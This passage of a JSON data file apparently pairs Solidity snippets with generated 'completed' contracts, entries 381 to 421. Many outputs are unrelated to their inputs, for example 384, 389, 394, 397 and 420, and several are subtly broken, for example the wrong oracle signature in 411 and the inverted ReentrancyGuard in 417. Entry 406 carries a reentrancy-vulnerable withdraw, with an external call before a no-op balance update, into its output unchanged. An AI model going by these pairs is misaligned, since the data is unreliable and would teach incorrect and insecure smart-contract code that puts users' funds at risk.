        "output": "pragma solidity ^0.8.9;\ninterface ERC20 {\n  function transfer(address to, uint value) external returns (bool);\n  function transferFrom(address from, address to, uint value) external returns (bool);\n  function approve(address spender, uint value) external returns (bool);\n  function allowance(address owner, address spender) external view returns (uint);\n}\n\n"
    },
    "381.sol": {
        "input": "pragma solidity 0.8.21;\n\ncontract B {\n    constructor(address _permit, address _weth) {}\n}\n\ncontract C {\n    constructor(address _weth) {}\n}\n\ncontract A is B, C {\n    address public weth;\n\n    constructor(address _weth, address _permit)\n        B(_permit, _weth)\n        C(_weth)\n    {\n        weth = _weth;\n    }\n}\n\n\n",
        "output": "pragma solidity ^0.8.9;\ncontract B {\n    constructor(address _permit, address _weth) {}\n}\n\ncontract C {\n    constructor(address _weth) {}\n}\n\n"
    },
    "382.sol": {
        "input": "function foo(uint8 version) public {\n    if (version == 1) {\n    } else if (version == 2) {\n    } else {\n        revert();\n    }\n}\n\nfunction fooYul(uint8 version) public {\n    assembly {\n        switch version\n        case 1 {\n        }\n        case 2 {\n        }\n        default {\n            revert(0, 0)\n        }\n    }\n}\n\n\n",
        "output": "pragma solidity ^0.8.9;\ncontract YulVersions {\n    function foo(uint8 version) public {\n        if (version == 1) {\n        } else if (version == 2) {\n        } else {\n            revert();\n        }\n    }\n    \n    function fooYul(uint8 version) public {\n        assembly {\n            switch version\n            case 1 {\n            }\n            case 2 {\n            }\n            default {\n                revert(0, 0)\n            }\n        }\n    }\n}\n\n"
    },
    "383.sol": {
        "input": "contract MyToken is ERC20, AccessControl {\n    bytes32 public constant ADMIN_ROLE = keccak256(\"ADMIN_ROLE\");\n    bytes32 public constant MINTER_ROLE = keccak256(\"MINTER_ROLE\");\n    bytes32 public constant BURNER_ROLE = keccak256(\"BURNER_ROLE\");\n\n    constructor() ERC20(\"MyToken\", \"TKN\") {\n        _setupRole(ADMIN_ROLE, msg.sender);\n    }\n\n    function mint(address to, uint256 amount) public onlyRole(MINTER_ROLE) {\n        _mint(to, amount);\n    }\n\n    function burn(address from, uint256 amount) public onlyRole(BURNER_ROLE) {\n        _burn(from, amount);\n    }\n\n    function setupMinter(address minter, bool enabled) external onlyRole(ADMIN_ROLE) {\n        require(minter != address(0), \"!minter\");\n        if (enabled) _setupRole(MINTER_ROLE, minter);\n        else _revokeRole(MINTER_ROLE, minter);   \n    }\n\n    function setupBurner(address burner, bool enabled) external onlyRole(ADMIN_ROLE) {\n        require(burner != address(0), \"!burner\");\n        if (enabled) _setupRole(BURNER_ROLE, burner);\n        else _revokeRole(BURNER_ROLE, burner);   \n    }    \n\n    function isMinter(address minter) external view returns(bool) {\n        return hasRole(MINTER_ROLE, minter);\n    }\n\n    function isBurner(address burner) external view returns(bool) {\n        return hasRole(BURNER_ROLE, burner);\n    }    \n}\n\n\n",
        "output": "pragma solidity ^0.8.9;\nabstract contract ERC20 {\n  function totalSupply() external view virtual returns (uint256);\n  function balanceOf(address account) external view virtual returns (uint256);\n\n  function transfer(address recipient, uint256 amount)\n    external\n    virtual\n    returns (bool);\n\n  function allowance(address owner, address spender)\n    external\n    view\n    virtual\n    returns (uint256);\n\n  function transferFrom(address sender, address recipient, uint256 amount)\n    external\n    virtual;\n\n  event Transfer(address indexed from, address indexed to, uint256 value);\n  event Approval(address indexed owner, address indexed spender, uint256 value);\n}\n\n"
    },
    "384.sol": {
        "input": "module.exports = {\n  solidity: \"0.8.4\",\n  networks: {\n    ropsten: {\n      url: process.env.REACT_APP_RINKEBY_RPC_URL\n      accounts: [process.env.REACT_APP_PRIVATE_KEY],\n    },\n  },\n  etherscan: {\n    apiKey: process.env.REACT_APP_ETHERSCAN_KEY,\n  },\n};\n\n\n",
        "output": "pragma solidity ^0.8.9;\ncontract Test {\n    constructor(address payable _owner) {\n        _transfer(msg.sender, _owner, 0);\n    }\n\n    function test() public pure virtual {\n    }\n\n    function _transfer(address from, address to, uint256 _amount) internal virtual {\n        (bool success, ) = from.call{value: _amount}(new bytes(0));\n        require(success, \"transfer failed\");\n    }\n}\n\n"
    },
    "385.sol": {
        "input": "mapping (address=>uint256) lastUpdated;\n\nlastUpdated = block.timestamp;\n\nfunction removeTokenFromInactiveAccount(address inactiveUser, address transferTo) public {\n  require(block.timestamp > lastUpdated[inactiveUser]+inactivePeriod, \"Inactive period threshold not reached\");\n  transferFrom(inactiveUser, transferTo, balanceOf(inactiveUser));\n}\n\n_allowed[owner][this(address)] = \n\n\n",
        "output": "pragma solidity ^0.8.9;\ncontract MyContract {\n    mapping (address => uint256) lastUpdated;\n    uint256 inactivePeriod = 86400; // Number of seconds in a day\n\n    function removeTokenFromInactiveAccount(address inactiveUser, address transferTo) public {\n        require(block.timestamp > lastUpdated[inactiveUser] + inactivePeriod, \"Inactive period threshold not reached\");\n        transferFrom(inactiveUser, transferTo, balanceOf(inactiveUser));\n    }\n\n    function balanceOf(address account) public view returns (uint256) {\n        // Implement the logic to get the balance of an account\n        // Replace this with your own implementation\n        return 0;\n    }\n\n    function transferFrom(address from, address to, uint256 amount) internal {\n        // Implement the logic to transfer tokens from one account to another\n        // Replace this with your own implementation\n    }\n}\n\n"
    },
    "386.sol": {
        "input": "pragma solidity ^0.8;\n\ncontract MyContract {\n    address[3] addresses; \n    uint256 number; \n\n    constructor(address[2] memory _addresses, uint256 _number) {\n        addresses = _addresses;\n        number = _number;\n    }\n}\n\npragma solidity ^0.8;\n\ncontract MyContract {\n    \n    address[] addresses;\n\n    uint256 number;\n\n    constructor(address[] memory _addresses, uint256 _number) {\n        addresses = _addresses;\n        number = _number;\n    }\n}\n\n\n",
        "output": "pragma solidity ^0.8.9;\ncontract MyContract {\n    \n    address[] addresses;\n\n    uint256 number;\n\n    constructor(address[] memory _addresses, uint256 _number) {\n        addresses = _addresses;\n        number = _number;\n    }\n\n    \n}\n\n"
    },
    "387.sol": {
        "input": "     address payable owner;\n\n\n",
        "output": "pragma solidity ^0.5.16;\ncontract Ownable {\n  address payable public owner;\n\n  \n  constructor () public {\n    owner = msg.sender;\n  }\n\n  \n  modifier onlyOwner() {\n    require(msg.sender == owner);\n    _;\n  }\n}\n\n"
    },
    "389.sol": {
        "input": "mapping(address => uint256[]) private _ownedTokens;\n\n\n",
        "output": "pragma solidity ^0.8.9;\ninterface IERC20 {\n    function balanceOf(address account) external view returns (uint256);\n}\n\n"
    },
    "390.sol": {
        "input": "pragma solidity ^0.8.0;\n\ncontract Test {\n    uint[2] votes = [0,0];\n    address owner;\n\n    constructor() {\n        owner = msg.sender;\n    }\n\n    modifier onlyOwner() {\n        require(msg.sender == owner, \"You're not the owner!\");\n        _;\n    }\n\n    function vote_a() public{\n        votes[0] += 1;\n    }\n\n    function vote_b() public{\n        votes[1] += 1;\n    }\n\n    function results() public view returns(string memory){\n        uint a = votes[0];\n        uint b = votes[1];\n        \n        if (a==b)\n            return \"tie\";\n        else if (a>b)\n            return \"a wins\";\n        else\n            return \"b wins\";\n    }\n\n    function setResults() public onlyOwner {\n        votes[0] = 0;\n        votes[1] = 0;\n    }\n\n}\n\n\n",
        "output": "// SPDX-License-Identifier: MIT\npragma solidity ^0.8.0;\n\ncontract Test {\n    uint[2] votes = [0,0];\n    address owner;\n\n    // NOTE: I set a 'owner' variable with the address value who have deployed for the first time the smart contract\n    constructor() {\n        owner = msg.sender;\n    }\n\n    // NOTE: Modifier that allow only for smart contract owner the access to specific function\n    modifier onlyOwner() {\n        require(msg.sender == owner, \"You're not the owner!\");\n        _;\n    }\n\n    function vote_a() public{\n        votes[0] += 1;\n    }\n\n    function vote_b() public{\n        votes[1] += 1;\n    }\n\n    function results() public view returns(string memory){\n        uint a = votes[0];\n        uint b = votes[1];\n        \n        if (a==b)\n            return \"tie\";\n        else if (a>b)\n            return \"a wins\";\n        else\n            return \"b wins\";\n    }\n\n    // NOTE: I created a new function that allows you to handle the data inside array\n    function setResults() public onlyOwner {\n        votes[0] = 0;\n        votes[1] = 0;\n    }\n\n}\n\n"
    },
    "391.sol": {
        "input": "receiver.transfer(msg.value);  \n\nreceiver.transfer(address(this).balance);  \n\npragma solidity ^0.8.4;\n\ncontract ActualBank{\nuint minAccountBalance=1 ether;\naddress payable owner;\nmapping(address => uint256) balance ;\nmapping(address => uint256) secretKey;\n\nconstructor(){\n    owner=payable(msg.sender);\n}\n\nfunction openAccount(uint256 _secretKey) payable public returns(uint256) {\n    require(msg.value >= minAccountBalance,\"There must a minimum balance of 1 ether\");\n    balance[msg.sender]+=msg.value;\n    secretKey[msg.sender]=_secretKey;\n    return balance[msg.sender];\n}\nfunction withDraw(uint256 _secretKey) payable public returns(uint256) {\n    require(address(this).balance >= balance[msg.sender],\"With drawal value not correct\");\n    require(secretKey[msg.sender] == _secretKey, \"Secret key didn't matched\");\n    balance[msg.sender] = 0;\n    address payable receiver= payable(msg.sender);\n    receiver.transfer(address(this).balance);  \n    return balance[msg.sender];\n}\nfunction getAccountBalance() public view returns(uint256){\n    return balance[msg.sender];\n}\n}\n\n\n",
        "output": "pragma solidity ^0.8.9;\ncontract ActualBank {\n    uint minAccountBalance = 1 ether;\n    address payable owner;\n    mapping(address => uint256) balance;\n    mapping(address => uint256) secretKey;\n\n    constructor() {\n        owner = payable(msg.sender);\n    }\n\n    function openAccount(uint256 _secretKey) payable public returns(uint256) {\n        require(msg.value >= minAccountBalance, \"There must be a minimum balance of 1 ether\");\n        balance[msg.sender] += msg.value;\n        secretKey[msg.sender] = _secretKey;\n        return balance[msg.sender];\n    }\n    \n    function withdraw(uint256 _secretKey) payable public returns(uint256) {\n        require(address(this).balance >= balance[msg.sender], \"Withdrawal value not correct\");\n        require(secretKey[msg.sender] == _secretKey, \"Secret key didn't match\");\n        uint256 amount = balance[msg.sender];\n        balance[msg.sender] = 0;\n        payable(msg.sender).transfer(amount);\n        return balance[msg.sender];\n    }\n    \n    function getAccountBalance() public view returns(uint256) {\n        return balance[msg.sender];\n    }\n}\n"
    },
    "392.sol": {
        "input": "contract A {\n    uint256 arrSize;\n    constructor(uint256 _size){\n        arrSize = _size;\n    }\n\n    function giveMeAnArray() public pure returns (uint256[]){\n        uint256[arrSize] memory arr; \n        uint256[] memory arr = new uint256[](arrSize); \n    }\n}\n\n\n",
        "output": "pragma solidity ^0.8.9;\ncontract A {\n    uint256 public arrSize;\n    \n    constructor(uint256 _size) public {\n        arrSize = _size;\n    }\n\n    function giveMeAnArray() public view returns (uint256[] memory){\n        uint256[] memory arr = new uint256[](arrSize); \n        for(uint i=0; i<arrSize; i++){\n            arr[i] = i+1; // or some other logic to fill array\n        }\n        return arr;\n    }\n}\n\n"
    },
    "393.sol": {
        "input": "function getOngoingSales() public view returns(Sale[] memory) {\n    Sale[] memory _ongoingSales;\n\n    for(uint i = 0; i<sales.length; i++) {\n        if (sales[i].ended == false) _ongoingSales.push(sales[i]);\n    }\n\n    return _ongoingSales;\n}\n\n\n",
        "output": "pragma solidity ^0.4.25;\ninterface Sales {\n    function getOngoingSales() external view returns(Sale[] memory);\n}\n\ncontract Sale {\n    struct Sale {\n        address creator;\n        bool ended;\n        uint startTime;\n        uint endTime;\n    }\n\n    Sales[] public sales;\n\n    function() external payable {\n        revert();\n    }\n}\n\n"
    },
    "394.sol": {
        "input": "function mint(uint256 _mintAmount) public payable mintCompliance(_mintAmount) mintPriceCompliance(_mintAmount) {\n    require(!paused, 'The contract is paused!');\n\n    _safeMint(_msgSender(), _mintAmount);\n\n   payable(owner()).transfer(msg.value);\n}\n\n\n",
        "output": "pragma solidity ^0.8.9;\ncontract Ownership {\n    address public owner;\n    \n    constructor () {\n        owner = msg.sender;\n    }\n}\n\n"
    },
    "395.sol": {
        "input": "\n    \n    function oracleRequest(\n        address sender,\n        uint256 payment,\n        bytes32 specId,\n        address callbackAddress,\n        bytes4 callbackFunctionId,\n        uint256 nonce,\n        uint256 dataVersion,\n        bytes calldata data\n    ) external override validateFromLINK validateIsAuthorizedConsumer(sender) {\n        revert(\"use the operatorRequest only\");\n    }\n\n    \n    function operatorRequest(\n        address sender,\n        uint256 payment,\n        bytes32 specId,\n        bytes4 callbackFunctionId,\n        uint256 nonce,\n        uint256 dataVersion,\n        bytes calldata data\n    ) external override validateIsAuthorizedConsumer(sender) validateFromLINK {\n        (\n            bytes32 requestId,\n            uint256 expiration\n        ) = _verifyAndProcessOracleRequest(\n                sender,\n                payment,\n                sender,\n                callbackFunctionId,\n                nonce,\n                dataVersion\n            );\n        emit OracleRequest(\n            specId,\n            sender,\n            requestId,\n            payment,\n            sender,\n            callbackFunctionId,\n            expiration,\n            dataVersion,\n            data\n        );\n    }\n\n\n    \n    function setAuthorizedConsumer(address _consumer) public onlyOwner {\n        require(\n            authorizedConsumer == address(0),\n            \"authorized consumer is already set\"\n        );\n        authorizedConsumer = _consumer;\n    }\n\n    \n    function _validateIsAuthorizedConsumer(address _consumer) internal view {\n        require(_consumer == authorizedConsumer, \"Not authorized sender\");\n    }\n\n    \n    modifier validateIsAuthorizedConsumer(address _consumer) {\n        _validateIsAuthorizedConsumer(_consumer);\n        _;\n    }\n\n\n\n\n",
        "output": "pragma solidity ^0.8.9;\ncontract MyContract {\n    address public authorizedConsumer;\n    \n    event OracleRequest(\n        bytes32 specId,\n        address sender,\n        bytes32 requestId,\n        uint256 payment,\n        address callbackAddress,\n        bytes4 callbackFunctionId,\n        uint256 expiration,\n        uint256 dataVersion,\n        bytes data\n    );\n    \n    constructor() {\n        authorizedConsumer = address(0);\n    }\n    \n    function oracleRequest(\n        address sender,\n        uint256 payment,\n        bytes32 specId,\n        address callbackAddress,\n        bytes4 callbackFunctionId,\n        uint256 nonce,\n        uint256 dataVersion,\n        bytes calldata data\n    ) external validateFromLINK validateIsAuthorizedConsumer(sender) {\n        revert(\"use the operatorRequest only\");\n    }\n    \n    function operatorRequest(\n        address sender,\n        uint256 payment,\n        bytes32 specId,\n        bytes4 callbackFunctionId,\n        uint256 nonce,\n        uint256 dataVersion,\n        bytes calldata data\n    ) external validateIsAuthorizedConsumer(sender) validateFromLINK {\n        (\n            bytes32 requestId,\n            uint256 expiration\n        ) = _verifyAndProcessOracleRequest(\n            sender,\n            payment,\n            sender,\n            callbackFunctionId,\n            nonce,\n            dataVersion\n        );\n        emit OracleRequest(\n            specId,\n            sender,\n            requestId,\n            payment,\n            sender,\n            callbackFunctionId,\n            expiration,\n            dataVersion,\n            data\n        );\n    }\n    \n    function setAuthorizedConsumer(address _consumer) public onlyOwner {\n        require(\n            authorizedConsumer == address(0),\n            \"authorized consumer is already set\"\n        );\n        authorizedConsumer = _consumer;\n    }\n    \n    function _validateIsAuthorizedConsumer(address _consumer) internal view {\n        require(_consumer == authorizedConsumer, \"Not authorized sender\");\n    }\n    \n    modifier validateIsAuthorizedConsumer(address _consumer) {\n        _validateIsAuthorizedConsumer(_consumer);\n        _;\n    }\n    \n    modifier validateFromLINK() {\n        // Add validation logic for LINK token\n        _;\n    }\n    \n    modifier onlyOwner() {\n        // Add only owner logic\n        _;\n    }\n    \n    function _verifyAndProcessOracleRequest(\n        address sender,\n        uint256 payment,\n        address callbackAddress,\n        bytes4 callbackFunctionId,\n        uint256 nonce,\n        uint256 dataVersion\n    ) internal returns (bytes32, uint256) {\n        // Add verification and processing logic\n    }\n}\n"
    },
    "396.sol": {
        "input": "pragma solidity ^0.8.0;\n\nimport \"https:\nimport \"https:\n\ncontract Mycontract is ERC20 {\n\naddress public oracle = 0x5f4eC3Df9cbd43714FE2740f5E3616155c5b8419;\n.....\n\n}\n\n\n",
        "output": "pragma solidity ^0.8.9;\ninterface Oracle {\n    function getPrice(address) external view returns (uint, uint);\n}\n\n"
    },
    "397.sol": {
        "input": "address payable[1000] memory winners;\n\nwinners[j].transfer(...);\n\n\n",
        "output": "pragma solidity ^0.8.9;\nlibrary SafeMath {\n    function mul(uint256 a, uint256 b) internal pure returns (uint256) {\n        if (a == 0) {\n          return 0;\n        }\n        uint256 c = a * b;\n        assert(c / a == b);\n        return c;\n    }\n\n    function div(uint256 a, uint256 b) internal pure returns (uint256) {\n        uint256 c = a / b;\n        return c;\n    }\n\n     function sub(uint256 a, uint256 b) internal pure returns (uint256) {\n        assert(b <= a);\n        return a - b;\n    }\n\n    function add(uint256 a, uint256 b) internal pure returns (uint256) {\n        uint256 c = a + b;\n        assert(c >= a);\n        return c;\n    }\n}\n\n"
    },
    "400.sol": {
        "input": " balance += Wallet[walletNumbers[msg.sender][i]].balance;\n\n        balance += walletInfo[walletNumbers[msg.sender][i]].balance;\n\n\n",
        "output": "pragma solidity ^0.8.9;\ncontract Wallet {\n\n    struct Wallet {\n        address owner;\n        uint256 balance;\n    }\n\n    struct WalletInfo {\n        address owner;\n        uint256 balance;\n    }\n}\n\n"
    },
    "401.sol": {
        "input": "function isArrayEven() public view returns(bool[] memory) {\n    bool[] memory ret = new bool[](arr.length);\n\n    for (uint i = 0; i < arr.length; i++) {\n        ret[i] = bool((arr[i]%2 == 0));\n    }\n\n    return ret;\n}\n\n\n",
        "output": "pragma solidity ^0.8.9;\n contract arrayExample {\n\n    uint[] public arr = [1, 2, 3, 4, 5, 6];\n\n    function isArrayEven() public view returns(bool[] memory) {\n        bool[] memory ret = new bool[](arr.length);\n\n        for (uint i = 0; i < arr.length; i++) {\n            ret[i] = bool((arr[i]%2 == 0));\n        }\n\n        return ret;\n    }\n}\n\n"
    },
    "402.sol": {
        "input": "pragma solidity ^0.8;\n\ncontract MyContract {\n    enum Status {\n        Vacant,\n        Occupied\n    }\n\n    Status currentStatus;\n\n    function setCurrentStatus(Status _currentStatus) external {\n        currentStatus = _currentStatus;\n    }\n\n    function getCurrentStatusVerbose() external view returns (string memory) {\n        if (currentStatus == Status.Vacant) {\n            return \"The current status is Vacant\";\n        } else if (currentStatus == Status.Occupied) {\n            return \"The current status is Occupied\";\n        }\n    }\n}\n\npragma solidity ^0.8;\n\ncontract MyContract {\n    event Occupy(address _occupant, uint _value);\n\n    enum Status {\n        Vacant,\n        Occupied\n    }\n\n    Status currentStatus;\n\n    function setCurrentStatus(Status _currentStatus) external {\n        currentStatus = _currentStatus;\n        emit Occupy(msg.sender, uint(_currentStatus));\n    }\n}\n\nmyContract.on('Occupy', async (event) => {\n    updateOccupancyInExternalDB(event);\n});\n\n\n",
        "output": "pragma solidity ^0.8.9;\ncontract MyContract {\n    event Occupy(address _occupant, uint _value);\n\n    enum Status {\n        Vacant,\n        Occupied\n    }\n\n    Status currentStatus;\n\n    function setCurrentStatus(Status _currentStatus) external {\n        currentStatus = _currentStatus;\n        emit Occupy(msg.sender, uint(_currentStatus));\n    }\n}\n\n"
    },
    "404.sol": {
        "input": "IERC20(WETH).approve(address(this), balanceWETH);\n\n\n",
        "output": "pragma solidity ^0.8.9;\ncontract WETH {\n    function transfer(address to, uint256 amount) external returns (bool) { }\n}\n\n"
    },
    "405.sol": {
        "input": "function step() public virtual;\n\n\n",
        "output": "pragma solidity ^0.8.9;\nabstract contract Step {\n\n    function step() public virtual;\n}\n\n"
    },
    "406.sol": {
        "input": "\nmapping(address => uint256) public balance;\n\nfunction deposit() external payable {\n  balance[msg.sender] += msg.value;\n}\n\nfunction withdraw() external {\n  msg.sender.call{value: balance[msg.sender]}(\"\"); \n  balance[msg.sender] == 0; \n}\n\nfunction withdrawV2(uint256 value) external {\n  require(value <= balance[msg.sender], \"you don't have that much\"); \n  msg.sender.call{value: balance[msg.sender]}(\"\");\n  unchecked { \n    balance[msg.sender] -= value;\n  }\n}\n\n\n",
        "output": "pragma solidity ^0.8.9;\ncontract Bank {\n  \n  mapping(address => uint256) public balance;\n\n  function deposit() external payable {\n  balance[msg.sender] += msg.value;\n}\n\nfunction withdraw() external {\n  msg.sender.call{value: balance[msg.sender]}(\"\"); \n  balance[msg.sender] == 0; \n} \n\nfunction withdrawV2(uint256 value) external{\n  require(value <= balance[msg.sender], \"you don't have that much\"); \n  msg.sender.call{value: balance[msg.sender]}(\"\");\n  unchecked { \n    balance[msg.sender] -= value;\n  }\n}\n\n\n}\n\n"
    },
    "407.sol": {
        "input": "function _burn(address account, uint256 value) internal {\n    require(account != address(0));\n\n    _totalSupply = _totalSupply.sub(value);\n    _balances[account] = _balances[account].sub(value);\n    emit Transfer(account, address(0), value);\n}\n\n\n",
        "output": "pragma solidity ^0.4.25;\ninterface Token {\n    \n    function totalSupply() external view returns (uint);\n\n    function balanceOf(address account) external view returns (uint);\n    function transfer(address to, uint value) external returns (bool);\n\n    function allowance(address owner, address spender) external view returns (uint);\n\n    function transferFrom(address from, address to, uint value) external returns (bool);\n\n    function approve(address spender, uint value) external returns (bool);\n    function approveAndCall(address spender, uint value, bytes data) public returns (bool Success);\n}\n\n"
    },
    "408.sol": {
        "input": "_setTokenURI(newItemId, string(abi.encodePacked(_uri, '/', newItemId.toString(), '.json')));\n\n\n",
        "output": "pragma solidity ^0.8.9;\ncontract ERC721 {\n    function _setTokenURI(uint256 tokenId, string memory _uri) internal {\n        _uri = _uri;\n    }\n}\n\n"
    },
    "409.sol": {
        "input": "contract Greeter {\n\n    receive() external payable {\n    }\n}\n\n\n",
        "output": "pragma solidity ^0.8.9;\ncontract Greeter {\n    // ...\n\n    receive() external payable {\n    }\n}\n\n"
    },
    "410.sol": {
        "input": "require( aaveLendingPool.withdraw(\n                address(dai),\n                amount,\n                msg.sender), \"Error, contract does not have enough DAI\")\n\n\n",
        "output": "pragma solidity ^0.8.9;\ninterface IWeth {\n    function withdraw(address, address, uint256) external returns (uint256);\n}\n\n"
    },
    "411.sol": {
        "input": "pragma solidity 0.8;\n\nimport \"@chainlink/contracts/src/v0.8/interfaces/AggregatorV3Interface.sol\";\n\ncontract MyContract {\n    AggregatorV3Interface priceFeed;\n    uint256 requiredPriceInUsd = 1000 * 1e18;\n\n    constructor() {\n        priceFeed = AggregatorV3Interface(0x5f4eC3Df9cbd43714FE2740f5E3616155c5b8419);\n    }\n\n    function getRequiredPriceInWei() public view returns (uint256) {\n        (,int answer,,,) = priceFeed.latestRoundData();\n\n        uint256 ethUsdPrice = uint256(answer) * 1e10;\n\n        return (requiredPriceInUsd * 1e18) / ethUsdPrice;\n    }\n}\n\n\n",
        "output": "pragma solidity ^0.8.9;\ninterface AggregatorV3Interface {\n\n    function latestRoundData() external view returns (\n        uint256\n      ,uint256\n      ,uint256\n      ,uint256\n      ,uint256\n      ,uint256\n      ,uint256\n      ,uint256\n      ,uint256\n        );\n}\n\n"
    },
    "413.sol": {
        "input": "uint256[] public C;\nfunction setVal(string memory C_) public returns(uint[] memory ret1) {\n    bytes memory b = bytes(C_);\n    for (uint i = 0; i < b.length; i++) {\n        if (b[i] >= 0x30 && b[i] <= 0x39) {\n            C.push(uint256(uint8(b[i]) - 48));\n        }\n    }\n    return C;\n}\n\n\n",
        "output": "pragma solidity ^0.8.9;\ncontract MyContract {\n    uint256[] public C;\n    function setVal(string memory C_) public returns(uint[] memory ret1) {\n        bytes memory b = bytes(C_);\n        for (uint i = 0; i < b.length; i++) {\n            if (b[i] >= 0x30 && b[i] <= 0x39) {\n                C.push(uint256(uint8(b[i]) - 48));\n            }\n        }\n        return C;\n    }\n}\n\n"
    },
    "414.sol": {
        "input": "pragma solidity >=0.4.22 <0.9.0;\n\ncontract StudentVotes {\n  Vote[] all_votes;\n\n  struct Vote_element {\n    string name;\n    uint numberOfVotes;\n  }\n\n  struct Vote{\n    string title;\n    address creator;\n    Vote_element[10] differentVotes;\n    bool done;\n  }\n\n  function createVote(string memory _title , string[] memory _elements) public {\n    Vote storage v = all_votes.push();\n    v.title = _title;\n    v.creator = msg.sender;\n    for(uint i = 0; i < _elements.length; i++)\n        v.differentVotes[i] = Vote_element(_elements[i], 0);\n    v.done = false;\n  }\n\n}\n\n\n",
        "output": "// SPDX-License-Identifier: MIT\npragma solidity >=0.4.22 <0.9.0;\n\ncontract StudentVotes {\n  Vote[] all_votes;\n\n  struct Vote_element {\n    string name;\n    uint numberOfVotes;\n  }\n\n  struct Vote{\n    string title;\n    address creator;\n    Vote_element[10] differentVotes;\n    bool done;\n  }\n\n  function createVote(string memory _title , string[] memory _elements) public {\n    // Before initializing the variable into a struct, you must push the struct into\n    // Votes' array.\n    Vote storage v = all_votes.push();\n    // Then you can initialize the each variable into a struct\n    v.title = _title;\n    v.creator = msg.sender;\n    for(uint i = 0; i < _elements.length; i++)\n        v.differentVotes[i] = Vote_element(_elements[i], 0);\n    v.done = false;\n  }\n\n}\n\n"
    },
    "415.sol": {
        "input": "function SeeBalance(IERC20 token) public view returns (uint256) {\n   return IERC20(token).balanceOf(address(this));\n}\n\n\n",
        "output": "pragma solidity ^0.8.9;\ninterface IERC20 {\n    function balanceOf(address account) external view returns (uint256);\n}\n\ncontract MyContract {\n    function SeeBalance(IERC20 token) public view returns (uint256) {\n       return IERC20(token).balanceOf(address(this));\n    }\n}\n\n"
    },
    "416.sol": {
        "input": "struct Users {\n        uint dipositTime;\n        uint withDrawTime;\n        uint lastDepositTime;\n}\nmapping(address => Users ) users;\n\nfunction depositeTimeSet(uint t) {\n  users[msg.sender].dipositTime = t minutes;\n  withdrawalTimeSet(t);\n}\nfunction withdrawalTimeSet(uint t) {\n  users[msg.sender].withDrawTime = 3 * t minutes\n}\nfunction deposite() {\n  transferFrom(msg.sender,address(this));\n  depositeTimeSet(3); \n  users[msg.sender].lastDepositTime = now;\n}\nfunction withdraw() {\n  if(\n     now > users[msg.sender].lastDepositTime + \n     users[msg.sender].withDrawTime,\"too early for withdraw \n     request\"\n  )\n  transferFrom(address(this),msg.sender);\n}\n\n\n",
        "output": "pragma solidity ^0.8.9;\ninterface ISaveDeposit {\n  function deposite(uint _d) external;\n  function withdraw() external;\n  \n}\n\n"
    },
    "417.sol": {
        "input": "pragma solidity >=0.7.0 <0.9.0;\n\ncontract EightFoundingFathers is ERC721A, Ownable, ReentrancyGuard {\n\n  string public        baseURI;\n  uint public          price             = 0.003 ether;\n  uint public          maxPerTx          = 20;\n  uint public          totalFree         = 1000;\n  uint public          maxSupply         = 1776;\n  uint256 public       maxFreePerWallet = 3;\n  bool public          mintEnabled;\n  mapping(address => uint256) private _mintedFreeAmount;\n\n  constructor() ERC721A(\"8Bit Founding Fathers\",\"8BFF\"){\n\n  }\n}\n\n\n",
        "output": "pragma solidity ^0.8.9;\ncontract Ownable {\n\n  address private owner;\n\n  constructor() {\n    owner = msg.sender;\n  }\n\n  modifier onlyOwner {\n    require(msg.sender==owner);\n    _;\n  }\n\n  function transferOwnership(address newOwner) public onlyOwner {\n    owner = newOwner;\n  }\n\n  function isOwner() external view returns (bool) {\n    return msg.sender==owner;\n  }\n}\n\ncontract ReentrancyGuard {\n\n  bool private _notEntered;\n\n  constructor() {\n    _notEntered = true;\n  }\n\n  modifier notEntered() {\n    require(!_notEntered);\n    _;\n    _notEntered = true;\n  }\n\n  modifier entered() {\n    require(_notEntered);\n    _;\n    _notEntered = false;\n  }\n}\n\n"
    },
    "419.sol": {
        "input": "import \"./ContractA.sol\"\n\ncontract ContractB {\n   ContractA instanceOfA;\n   \n   function callA() public {\n       instanceOfA.variableYouWantToAccess();\n   }\n}\n\n\n",
        "output": "pragma solidity ^0.4.25;\ncontract ContractA {\n    string public variableYouWantToAccess;\n    \n    function variableYouWantToAccess() public view returns(string) {\n        return variableYouWantToAccess;\n    }\n}\n\ncontract ContractB {\n   ContractA instanceOfA;\n   \n   function callA() public {\n       instanceOfA.variableYouWantToAccess();\n   }\n   \n   function setInstanceOfA(address _instanceOfA) public {\n       instanceOfA = ContractA(_instanceOfA);\n   }\n}\n\n"
    },
    "420.sol": {
        "input": "contract MultiToken is ERC1155 {\n    constructor(string memory uri) ERC1155(uri) payable {}\n}\n\nmultiToken = await factory.deploy(uri, {\n    value: ethers.utils.parseUnits(\"1\"), \n});\n\n\n",
        "output": "pragma solidity ^0.8.9;\ninterface MultiToken {\n    function balanceOf(address account) external view returns (uint);\n    function transferFrom(address from, address to, uint256 value) external;\n}\n\n"
    },
    "421.sol": {
        "input": "compilesFiles = JSON.parse(solc.compile(JSON.stringify(input))).contracts[\n'Inbox.sol'\n].Inbox;\n\ncompilesFiles = JSON.parse(solc.compile(JSON.stringify(input))).contracts[\n'Inbox.sol'\n].basic;\n\nconst path = require('path');\nconst fs = require('fs');\nconst solc = require('solc');\nconst fsExtra = require('fs-extra')\n \nconst inboxPath = path.resolve(__dirname, 'contracts', 'Inbox.sol');\nconst source = fs.readFileSync(inboxPath, 'utf8');\n \nconst input = {\n    language: 'Solidity',\n    sources: {\n        'Inbox.sol': {\n            content: source,\n        },\n    },\n    settings: {\n        outputSelection: {\n            '*': {\n                '*': ['*'],\n            },\n        },\n    },\n};\n\nfunction writeOutput(compiled, buildPath) {\n    fsExtra.ensureDirSync(buildPath);\n\n    for (let contractFileName in compiled.contracts) {\n        const contractName = contractFileName.replace('.sol', '');\n        console.log('Writing: ', contractName + '.json');\n        fsExtra.outputJsonSync(\n            path.resolve(buildPath, contractName + '.json'),\n            compiled.contracts[contractFileName].basic\n        );\n    }\n}\n \n \ncompilesFiles = JSON.parse(solc.compile(JSON.stringify(input)));\nconst buildPath = path.resolve(__dirname, 'build');\nwriteOutput(compilesFiles, buildPath);\n\n\n",
        "output": "pragma solidity ^0.4.25;\ncontract Inbox {\n    address public owner;\n    uint public count;\n\n    event LogNewInbox(address indexed sender, uint indexed logCount);\n\n    constructor() public {\n        owner = msg.sender;\n        count = 0;\n    }\n\n    function() external payable {\n        count++;\n        emit LogNewInbox(msg.sender, count);\n    }\n}\n\n"
    },
    "422.sol": {
